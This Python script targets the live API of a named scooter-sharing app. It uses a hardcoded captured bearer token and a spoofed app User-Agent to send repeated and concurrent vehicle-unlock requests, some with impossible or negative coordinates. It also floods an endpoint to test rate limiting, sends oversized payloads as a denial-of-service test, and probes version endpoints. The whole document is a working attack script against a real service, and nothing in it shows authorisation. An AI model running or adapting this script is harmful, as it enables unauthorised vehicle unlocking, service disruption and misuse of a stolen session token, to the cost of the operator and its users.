#!/usr/bin/env python3
"""
Exploit Newly Discovered Vulnerabilities
Demonstrate the business logic, rate limiting, and information disclosure vulnerabilities
"""

import requests
import json
import time
import threading
from datetime import datetime

# API Configuration
BASE_URL = "https://api.knotcity.io"

# Fresh token from capture
FRESH_TOKEN = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDM0OTMsInNlc3Npb25faWQiOiI3NmM0NzE3ZS03ZWM5LTRkN2MtOWRlOS00NjRiNjJlY2VhYzgiLCJpYXQiOjE3NTk0NTQ3NjQsImV4cCI6MTc1OTQ1ODM2NH0.ivnhjjDy1zEtAD1BTJAAK5V1vDtAaSHNuHZWpMspSFE"

def exploit_business_logic_vulnerabilities():
    """Exploit the business logic vulnerabilities discovered"""
    print("=" * 80)
    print("[EXPLOIT] BUSINESS LOGIC VULNERABILITIES")
    print("=" * 80)
    print("[TARGET] Exploit business logic flaws for unauthorized operations")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Exploit Double Unlock Attack
    print("\n[EXPLOIT] Double Unlock Attack")
    print("   Attempting to unlock the same vehicle multiple times...")
    
    double_unlock_success = 0
    for i in range(5):
        print(f"   Unlock attempt {i+1}/5")
        
        payload = {
            "serial_number": "TUF061",
            "lat": 48.8566,
            "lng": 2.3522
        }
        
        try:
            response = requests.post(
                f"{BASE_URL}/api/application/vehicles/unlock",
                headers=headers,
                json=payload,
                timeout=15
            )
            
            print(f"     Status: {response.status_code}")
            print(f"     Response: {response.text}")
            
            if response.status_code == 200:
                double_unlock_success += 1
                print(f"     [SUCCESS] Unlock {i+1} successful!")
            else:
                print(f"     [INFO] Unlock {i+1} status: {response.status_code}")
                
        except Exception as e:
            print(f"     [ERROR] Unlock {i+1} failed: {e}")
    
    if double_unlock_success > 1:
        print(f"\n   [VULNERABILITY] Double unlock attack successful: {double_unlock_success}/5 unlocks")
        print(f"   [CRITICAL] Business logic flaw allows multiple unlocks!")
    
    # Exploit Invalid Location Attack
    print("\n[EXPLOIT] Invalid Location Attack")
    print("   Testing with invalid/impossible coordinates...")
    
    invalid_locations = [
        {"lat": 999.999, "lng": 999.999, "name": "Impossible positive coordinates"},
        {"lat": -999.999, "lng": -999.999, "name": "Impossible negative coordinates"},
        {"lat": 0, "lng": 0, "name": "Null Island coordinates"},
        {"lat": 90.1, "lng": 180.1, "name": "Beyond valid range (positive)"},
        {"lat": -90.1, "lng": -180.1, "name": "Beyond valid range (negative)"}
    ]
    
    invalid_location_success = 0
    for location in invalid_locations:
        print(f"   Testing: {location['name']} ({location['lat']}, {location['lng']})")
        
        payload = {
            "serial_number": "TUF061",
            "lat": location['lat'],
            "lng": location['lng']
        }
        
        try:
            response = requests.post(
                f"{BASE_URL}/api/application/vehicles/unlock",
                headers=headers,
                json=payload,
                timeout=15
            )
            
            print(f"     Status: {response.status_code}")
            print(f"     Response: {response.text}")
            
            if response.status_code == 200:
                invalid_location_success += 1
                print(f"     [SUCCESS] Invalid location accepted!")
            else:
                print(f"     [INFO] Status: {response.status_code}")
                
        except Exception as e:
            print(f"     [ERROR] Request failed: {e}")
    
    if invalid_location_success > 0:
        print(f"\n   [VULNERABILITY] Invalid location attack successful: {invalid_location_success}/{len(invalid_locations)} locations")
        print(f"   [CRITICAL] Business logic flaw allows invalid coordinates!")
    
    # Exploit Negative Values Attack
    print("\n[EXPLOIT] Negative Values Attack")
    print("   Testing with negative latitude/longitude values...")
    
    negative_locations = [
        {"lat": -48.8566, "lng": -2.3522, "name": "Both negative"},
        {"lat": 48.8566, "lng": -2.3522, "name": "Longitude negative"},
        {"lat": -48.8566, "lng": 2.3522, "name": "Latitude negative"}
    ]
    
    negative_success = 0
    for location in negative_locations:
        print(f"   Testing: {location['name']} ({location['lat']}, {location['lng']})")
        
        payload = {
            "serial_number": "TUF061",
            "lat": location['lat'],
            "lng": location['lng']
        }
        
        try:
            response = requests.post(
                f"{BASE_URL}/api/application/vehicles/unlock",
                headers=headers,
                json=payload,
                timeout=15
            )
            
            print(f"     Status: {response.status_code}")
            print(f"     Response: {response.text}")
            
            if response.status_code == 200:
                negative_success += 1
                print(f"     [SUCCESS] Negative values accepted!")
            else:
                print(f"     [INFO] Status: {response.status_code}")
                
        except Exception as e:
            print(f"     [ERROR] Request failed: {e}")
    
    if negative_success > 0:
        print(f"\n   [VULNERABILITY] Negative values attack successful: {negative_success}/{len(negative_locations)} locations")
        print(f"   [CRITICAL] Business logic flaw allows negative coordinates!")
    
    return {
        "double_unlock": double_unlock_success,
        "invalid_location": invalid_location_success,
        "negative_values": negative_success
    }

def exploit_rate_limiting_vulnerabilities():
    """Exploit the rate limiting vulnerabilities discovered"""
    print("\n" + "=" * 80)
    print("[EXPLOIT] RATE LIMITING VULNERABILITIES")
    print("=" * 80)
    print("[TARGET] Exploit rate limiting bypass and DoS vulnerabilities")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Exploit Rate Limiting Bypass
    print("\n[EXPLOIT] Rate Limiting Bypass")
    print("   Sending 30 rapid requests to test rate limiting...")
    
    rate_limit_bypassed = False
    successful_requests = 0
    blocked_requests = 0
    
    for i in range(30):
        try:
            response = requests.get(
                f"{BASE_URL}/api/application/users",
                headers=headers,
                timeout=5
            )
            
            if response.status_code == 200:
                successful_requests += 1
            elif response.status_code == 429:
                blocked_requests += 1
                print(f"   [RATE LIMITED] Request {i+1} blocked (429)")
                break
            elif response.status_code == 403:
                blocked_requests += 1
                print(f"   [BLOCKED] Request {i+1} blocked (403)")
                break
            
            if i % 5 == 0:  # Print every 5th request
                print(f"   Request {i+1}: Status {response.status_code}")
            
        except Exception as e:
            print(f"   [ERROR] Request {i+1} failed: {e}")
            break
    
    if successful_requests >= 20:
        rate_limit_bypassed = True
        print(f"\n   [VULNERABILITY] Rate limiting bypassed!")
        print(f"   [CRITICAL] {successful_requests} requests successful without rate limiting")
        print(f"   [WARNING] DoS attack possible!")
    
    # Exploit Large Payload DoS
    print("\n[EXPLOIT] Large Payload DoS Attack")
    print("   Sending large payload to test DoS vulnerability...")
    
    # Create progressively larger payloads
    payload_sizes = [1000, 5000, 10000, 50000, 100000]  # 1KB to 100KB
    
    for size in payload_sizes:
        print(f"   Testing payload size: {size} bytes")
        
        large_payload = {
            "serial_number": "TUF061",
            "lat": 48.8566,
            "lng": 2.3522,
            "large_data": "A" * size
        }
        
        try:
            start_time = time.time()
            response = requests.post(
                f"{BASE_URL}/api/application/vehicles/unlock",
                headers=headers,
                json=large_payload,
                timeout=30
            )
            end_time = time.time()
            
            response_time = end_time - start_time
            print(f"     Status: {response.status_code}")
            print(f"     Response time: {response_time:.2f} seconds")
            print(f"     Response: {response.text[:100]}{'...' if len(response.text) > 100 else ''}")
            
            if response.status_code == 200:
                print(f"     [SUCCESS] Large payload accepted!")
                if response_time > 10:
                    print(f"     [VULNERABILITY] Slow response time indicates DoS potential!")
            elif response.status_code == 413:
                print(f"     [BLOCKED] Payload too large (413)")
                break
            else:
                print(f"     [INFO] Status: {response.status_code}")
                
        except Exception as e:
            print(f"     [ERROR] Request failed: {e}")
            break
    
    return {
        "rate_limit_bypass": rate_limit_bypassed,
        "successful_requests": successful_requests,
        "blocked_requests": blocked_requests
    }

def exploit_information_disclosure_vulnerabilities():
    """Exploit the information disclosure vulnerability discovered"""
    print("\n" + "=" * 80)
    print("[EXPLOIT] INFORMATION DISCLOSURE VULNERABILITIES")
    print("=" * 80)
    print("[TARGET] Exploit the /api/application/versions endpoint")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Exploit Version Information Disclosure
    print("\n[EXPLOIT] Version Information Disclosure")
    print("   Accessing /api/application/versions endpoint...")
    
    try:
        response = requests.get(
            f"{BASE_URL}/api/application/versions",
            headers=headers,
            timeout=15
        )
        
        print(f"   Status: {response.status_code}")
        print(f"   Response: {response.text}")
        
        if response.status_code == 200:
            print(f"\n   [SUCCESS] Version information disclosed!")
            print(f"   [VULNERABILITY] System version information accessible!")
            
            # Try to parse and extract useful information
            try:
                data = response.json()
                print(f"   [EXTRACTED] Version data structure:")
                print(f"     {json.dumps(data, indent=2)}")
                
                # Save version information
                with open("VERSION_INFORMATION.json", "w", encoding="utf-8") as f:
                    json.dump(data, f, indent=2, ensure_ascii=False)
                print(f"   [SAVED] Version information saved to VERSION_INFORMATION.json")
                
            except Exception as e:
                print(f"   [INFO] Could not parse JSON response: {e}")
                
        elif response.status_code == 403:
            print(f"   [BLOCKED] Permission denied")
        elif response.status_code == 404:
            print(f"   [NOT FOUND] Endpoint not found")
        else:
            print(f"   [INFO] Status: {response.status_code}")
            
    except Exception as e:
        print(f"   [ERROR] Request failed: {e}")
    
    # Test additional version-related endpoints
    print("\n[EXPLOIT] Additional Version Endpoints")
    version_endpoints = [
        "/api/application/version",
        "/api/application/version/info",
        "/api/application/version/details",
        "/api/application/version/history",
        "/api/application/version/current",
        "/api/application/version/latest"
    ]
    
    additional_disclosures = []
    
    for endpoint in version_endpoints:
        print(f"   Testing: {endpoint}")
        
        try:
            response = requests.get(
                f"{BASE_URL}{endpoint}",
                headers=headers,
                timeout=15
            )
            
            if response.status_code == 200:
                print(f"     [SUCCESS] Additional version info: {endpoint}")
                print(f"     Response: {response.text[:200]}{'...' if len(response.text) > 200 else ''}")
                additional_disclosures.append(endpoint)
            elif response.status_code == 403:
                print(f"     [BLOCKED] Permission denied")
            elif response.status_code == 404:
                print(f"     [NOT FOUND] Endpoint not found")
            else:
                print(f"     [INFO] Status: {response.status_code}")
                
        except Exception as e:
            print(f"     [ERROR] Request failed: {e}")
    
    return {
        "versions_endpoint": response.status_code == 200 if 'response' in locals() else False,
        "additional_endpoints": additional_disclosures
    }

def demonstrate_concurrent_attacks():
    """Demonstrate concurrent attacks using threading"""
    print("\n" + "=" * 80)
    print("[EXPLOIT] CONCURRENT ATTACKS DEMONSTRATION")
    print("=" * 80)
    print("[TARGET] Demonstrate concurrent business logic attacks")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    results = []
    
    def concurrent_unlock(thread_id, vehicle_id, lat, lng):
        """Function to perform concurrent unlock"""
        payload = {
            "serial_number": vehicle_id,
            "lat": lat,
            "lng": lng
        }
        
        try:
            response = requests.post(
                f"{BASE_URL}/api/application/vehicles/unlock",
                headers=headers,
                json=payload,
                timeout=15
            )
            
            result = {
                "thread_id": thread_id,
                "vehicle_id": vehicle_id,
                "status": response.status_code,
                "response": response.text
            }
            results.append(result)
            
            print(f"   Thread {thread_id}: {vehicle_id} - Status {response.status_code}")
            
        except Exception as e:
            result = {
                "thread_id": thread_id,
                "vehicle_id": vehicle_id,
                "status": "ERROR",
                "response": str(e)
            }
            results.append(result)
            print(f"   Thread {thread_id}: {vehicle_id} - ERROR: {e}")
    
    # Create concurrent unlock threads
    print("\n[EXPLOIT] Concurrent Unlock Attack")
    print("   Launching 5 concurrent unlock attempts...")
    
    threads = []
    vehicles = ["TUF061", "SXB306", "ABC123", "XYZ789", "TEST01"]
    
    for i, vehicle in enumerate(vehicles):
        thread = threading.Thread(
            target=concurrent_unlock,
            args=(i+1, vehicle, 48.8566, 2.3522)
        )
        threads.append(thread)
        thread.start()
    
    # Wait for all threads to complete
    for thread in threads:
        thread.join()
    
    # Analyze results
    successful_concurrent = 0
    for result in results:
        if result["status"] == 200:
            successful_concurrent += 1
    
    print(f"\n   [RESULTS] Concurrent attack results:")
    print(f"     Successful unlocks: {successful_concurrent}/{len(vehicles)}")
    
    if successful_concurrent > 1:
        print(f"   [VULNERABILITY] Concurrent unlock attack successful!")
        print(f"   [CRITICAL] Multiple vehicles unlocked simultaneously!")
    
    return results

def main():
    print("=" * 80)
    print("[EXPLOIT] NEWLY DISCOVERED VULNERABILITIES EXPLOITATION")
    print("=" * 80)
    print("[WARNING] Exploiting business logic, rate limiting, and information disclosure vulnerabilities!")
    print("=" * 80)
    
    # Exploit all newly discovered vulnerabilities
    business_logic_results = exploit_business_logic_vulnerabilities()
    rate_limiting_results = exploit_rate_limiting_vulnerabilities()
    info_disclosure_results = exploit_information_disclosure_vulnerabilities()
    concurrent_results = demonstrate_concurrent_attacks()
    
    # Summary
    print("\n" + "=" * 80)
    print("[RESULTS] NEW VULNERABILITIES EXPLOITATION SUMMARY")
    print("=" * 80)
    
    print(f"\n[BUSINESS LOGIC EXPLOITATION] Results:")
    total_business_logic = (business_logic_results["double_unlock"] + 
                           business_logic_results["invalid_location"] + 
                           business_logic_results["negative_values"])
    if total_business_logic > 0:
        print(f"   [CRITICAL] {total_business_logic} business logic exploits successful!")
        print(f"     Double unlock: {business_logic_results['double_unlock']}/5")
        print(f"     Invalid location: {business_logic_results['invalid_location']}/5")
        print(f"     Negative values: {business_logic_results['negative_values']}/3")
    else:
        print(f"   [OK] No business logic exploits successful")
    
    print(f"\n[RATE LIMITING EXPLOITATION] Results:")
    if rate_limiting_results["rate_limit_bypass"]:
        print(f"   [CRITICAL] Rate limiting bypass successful!")
        print(f"     Successful requests: {rate_limiting_results['successful_requests']}")
        print(f"     Blocked requests: {rate_limiting_results['blocked_requests']}")
    else:
        print(f"   [OK] Rate limiting working properly")
    
    print(f"\n[INFORMATION DISCLOSURE EXPLOITATION] Results:")
    if info_disclosure_results["versions_endpoint"]:
        print(f"   [HIGH] Version information disclosure successful!")
        print(f"     Additional endpoints: {len(info_disclosure_results['additional_endpoints'])}")
    else:
        print(f"   [OK] No additional information disclosure")
    
    print(f"\n[CONCURRENT ATTACKS] Results:")
    successful_concurrent = sum(1 for r in concurrent_results if r["status"] == 200)
    if successful_concurrent > 1:
        print(f"   [CRITICAL] Concurrent attack successful!")
        print(f"     Successful concurrent unlocks: {successful_concurrent}")
    else:
        print(f"   [OK] Concurrent attacks blocked")
    
    # Overall assessment
    total_exploits = (total_business_logic + 
                     (1 if rate_limiting_results["rate_limit_bypass"] else 0) +
                     (1 if info_disclosure_results["versions_endpoint"] else 0) +
                     (1 if successful_concurrent > 1 else 0))
    
    print(f"\n[OVERALL ASSESSMENT]")
    print(f"   Total successful exploits: {total_exploits}")
    
    if total_exploits > 0:
        print(f"   [CRITICAL] Multiple new vulnerabilities successfully exploited!")
        print(f"   [WARNING] MaynDrive app has additional security issues!")
    else:
        print(f"   [OK] No new vulnerabilities could be exploited")
    
    print("=" * 80)

if __name__ == "__main__":
    main()
